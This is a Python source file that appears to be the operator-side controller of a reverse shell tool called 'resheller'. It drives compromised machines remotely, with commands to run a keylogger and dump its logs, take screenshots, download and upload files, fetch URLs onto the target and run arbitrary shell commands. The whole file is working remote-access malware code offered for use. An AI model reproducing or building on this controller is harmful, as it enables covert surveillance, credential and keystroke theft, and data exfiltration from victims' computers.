#!/usr/bin/env python3
from base64 import b64decode
from json import dumps, loads
from os import path, makedirs, name
from pathlib import Path
from time import strftime

from src.stdout.color import Color


class Shell:

    def __init__(self, ips, targets, sessions):
        self.ips = ips
        self.targets = targets
        self.target = targets[sessions]
        self.ip, _ = ips[sessions]
        self._dir = f"{str(Path.home())}/.resheller"

    def make_dir(self):
        if not path.isdir(self._dir):
            makedirs(self._dir)

    def keylogger_dump(self):
        log_file = f'keylog_{strftime("%Y.%m.%d-%H.%M.%S")}.txt'
        self.make_dir()
        with open(f"{self._dir}/{log_file}", 'w') as log:
            log.write(self.safe_recv())
        print(Color(f"[+] Dumped Logs to {self._dir}\n").grn())

    def download(self, command):
        self.make_dir()
        with open(f"{self._dir}/{command[9:]}", 'wb') as file:
            file.write(b64decode(self.safe_recv()))
        print(Color(f'[+] Downloaded "{command[9:]}" to {self._dir}\n').grn())

    def screenshot(self):
        self.make_dir()
        count = 1
        while True:
            screenshot = f"screenshot{count}"
            if path.isfile(screenshot):
                count += 1
            else:
                break
        with open(f"{self._dir}/{screenshot}", "wb") as shot:
            image = self.safe_recv()
            image_decoded = b64decode(image)
            if image_decoded[:3] == "[!]":
                print(Color(image_decoded).b_red())
            else:
                shot.write(image_decoded)
            shot.close()
        print(Color(f"[+] Saved {screenshot} to {self._dir}\n").grn())

    def safe_recv(self):
        data = "".encode('utf-8')
        while True:
            try:
                data = data + self.target.recv(1024)
                return loads(data)
            except ValueError:
                continue

    def safe_send(self, data):
        json_data = dumps(data)
        self.target.send(json_data.encode('utf-8'))

    def print_stdout(self):
        stdout = self.safe_recv()
        if stdout[:3] == "[+]" and len(stdout) > 3:
            stdout = Color(stdout).b_grn()
        elif stdout == '[+]':
            return
        elif stdout[:3] == "[!]":
            stdout = Color(stdout).b_red()
        print(f"{stdout}\n")

    def get_path(self):
        if name == "nt":
            slash = "\\"
            self.safe_send("cd")
        else:
            slash = "/"
            self.safe_send("pwd")
        stdout = self.safe_recv()
        dir_list = stdout.split(slash)
        if len(dir_list) > 2:
            dir_list.pop(0)
            simplified = dir_list.pop(0)
            basename = dir_list.pop(-1)
            count = 0
            while count < len(dir_list):
                simplified = path.join(simplified, "..")
                count += 1
            stdout = path.join(simplified, basename)
        return stdout[:-1]

    def ps1(self):
        win_path = self.get_path()
        return input(f'{Color("{").b_blu()}{Color("shell").b_red()}'
                     f'{Color("@").b_blu()}{Color(self.ip).b_red()}:'
                     f'{Color(win_path).b_grn()}{Color("}>").b_blu()} ')

    @staticmethod
    def help():
        help_options = (
            "\n"
            "help            --> print this help message\n"
            "download <path> --> download file from target\n"
            "upload <path>   --> upload file from target\n"
            "get <url>       --> download file from website to target\n"
            "screenshot      --> take screenshot on target\n"
            "check           --> check for admin privileges\n"
            "keylog <opt>    --> <start> --> start keylogger on target\n"
            "                    <dump>  --> retrieve logs from target\n"
            "quit            --> exit reverse shell\n"
        )
        print(Color(help_options).ylw())

    def exit_shell(self):
        self.target.close()
        self.targets.remove(self.target)
        self.ips.remove(self.ip)

    def shell(self):
        print(Color("[+] Connection Established\n").b_grn())
        while True:
            command = self.ps1()
            if command == "ls":
                command = "dir"
            self.safe_send(command)
            if command == 'quit':
                break
            elif command == "exit":
                self.exit_shell()
                break
            elif command[:15] == 'keylogger start':
                print(Color("[+] Started Keylogger").b_grn())
                continue
            elif command[:14] == "keylogger dump":
                self.keylogger_dump()
            elif command[:8] == "download":
                self.download(command)
            elif command[:10] == "screenshot":
                self.screenshot()
            elif command == "help":
                self.help()
            else:
                self.print_stdout()
